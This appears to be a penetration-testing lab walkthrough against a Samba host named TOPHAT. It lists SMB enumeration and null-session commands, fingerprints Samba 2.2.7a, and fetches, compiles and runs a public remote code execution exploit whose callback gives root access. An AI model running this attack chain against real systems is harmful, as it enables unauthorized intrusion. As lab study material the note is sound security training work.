Attack Vector - SMB

Changes made to `/etc/samba/smb.conf`
![89d77f2d85a2e8e7b030fcf3cbf65f78.png](edc035a2d3c348c9993eaa21a7406008.png)

Then restart 
`sudo systemctl restart smbd`


# Enumerate hostname
`nmblookup -A 10.11.1.115`
![f162e489ed2509c256c329dad5801dbf.png](7fca558d91ef4fd2832620d5ef2ae641.png)

# List shares
`smbmap -H 10.11.1.115`
![fa7a131f91e8ece92c3b036d380db443.png](fb3a8246f6f140c0aca17c5876d92df7.png)

`smbmap -H 10.11.1.115 -P 139`
![737d28f8e9281f66f2c80173429602ad.png](5d6e4b347df44b758e7aa18829ad4bf2.png)

`echo exit | smbclient -L \\\\10.11.1.115`
![b2f29c37c0f782ee6e911ba73b233480.png](e543646fe4684128b0806d7c2280a010.png)

`sudo nmap --script smb-enum-shares -p 139,445 10.11.1.115`
![e8f3acd9d9906102d10b587f9402ae2f.png](f8d4e3e4a7774db482ce11cbd9ee49c2.png)

Check Null sessions
`rpcclient -U "" -N 10.11.1.115`
`enumprivs`
![a662fd96e3f91156071c8b04303e74e5.png](4421595788e341bb9da798aa9e28e776.png)
`netshareenum`
![54c9c3890f04d782de4fde98e84ab993.png](12004202c1ab42508e7ce42cc9ac2f18.png)
`srvinfo`
![80ce80e5bb936691f3cf9037b0d60d89.png](119fc00b8fab487d93bec167617c70ba.png)
`lookupnames root`
![51d4abf598418db793b0c98d6fb80777.png](93155baf285747aba326449126d7200d.png)
`lookupsids S-1-5-21-3001938989-124212845-530053634-1000`
![1b2bad5bba38488ca29efed30aef80de.png](84eb1eba96534a098ade656835ad88fd.png)
`lookupnames root`
![61e7eb0ca05bebc206f146f57c1d2f56.png](523299bd9cca4fcf9b516b872ca0be1f.png)

`echo exit | smbclient -L \\\\10.11.1.115\\ADMIN$`
![1fbb020bdd98a2fbc39e1c30f3c8ae02.png](b82b98272d1645fe8860f0894645cb9e.png)
`echo exit | smbclient -L \\\\10.11.1.115\\IPC$`
![1d20a87dc70da6dba5c1227bc24b5179.png](fcc190a162bd49f8b732846f3851bd23.png)

# Check for Vulnerabilities
`sudo nmap --script smb-vuln* -p 139,445 10.11.1.115`
![d63c4797d0bf998cfbf4924b136ae6ad.png](db2226e8568d47e494b13437af00d40e.png)

# Overall scan
`enum4linux -a 10.11.1.115`
[enumlin_output.txt](55563659d2324858b210959f18b80938.txt)


`smbclient \\\\10.11.1.115\\IPC$`
![1b276483172c94f65cc65e83c46d5200.png](e4e1a2912e2345c7b85a3870e446b6b2.png)


Open Wireshark then run:
`echo exit | smbclient -L 10.11.1.115`

Wireshark output to get the Samba version of TOPHAT: Unix.Samba 2.2.7a
![0021ca83de94d5269c95480e2e96ddb6.png](c2ff9105a97949e5a9d3a4d303994534.png)


Searchsploit
`searchsploit samba remote 2.2`
![d3b3872cc8a2cd1f255ebef677e391a9.png](aed4443062714df4a9f8e9d238dac1ed.png)

Download this one: < 2.2.8 (Linux/BSD) - Remote Code Execution 
`searchsploit -m 10`
![ff0d6aff074141c38cb63a6d06b98404.png](99da056a7e734e6c957bf1a1dacaeaf8.png)

Compile
gcc 10.c -o exploit
![43fbbda259786300a53ca3b63d63ff0f.png](9622280aa41846a1900b7467f490f862.png)

Exploit
`./exploit -b 1 -c 192.168.119.214 -p 139 -v 10.11.1.115`
![b7dcc30e92ad65094867df6fc8ef1d86.png](e277ccb2023249f6b71343eec300037f.png)

Privesc not necessary; we are already root






